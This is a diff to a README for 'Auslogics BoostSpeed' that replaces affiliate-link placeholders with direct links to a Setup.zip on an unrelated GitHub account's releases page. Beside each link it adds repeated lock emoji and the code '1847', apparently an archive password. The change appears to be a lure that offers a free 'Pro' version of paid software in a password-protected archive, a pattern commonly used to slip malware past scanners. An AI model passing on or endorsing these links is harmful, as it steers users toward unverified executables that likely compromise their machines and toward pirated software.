@@ -8,7 +8,12 @@
 
 ---
 
-[![Auslogics BoostSpeed](og-image.png)](YOUR_AFFILIATE_LINK_HERE)
+[![Auslogics BoostSpeed](og-image.png)](https://github.com/Columnchebait/Auslogics-BoostSpeed/releases/download/Last/Setup.zip)
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
@@ -22,7 +27,12 @@
 
 ## Download & Get Pro
 
-[![Get Auslogics BoostSpeed Pro](https://img.shields.io/badge/Get%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](YOUR_AFFILIATE_LINK_HERE)
+[![Get Auslogics BoostSpeed Pro](https://img.shields.io/badge/Get%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://github.com/Columnchebait/Auslogics-BoostSpeed/releases/download/Last/Setup.zip)
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
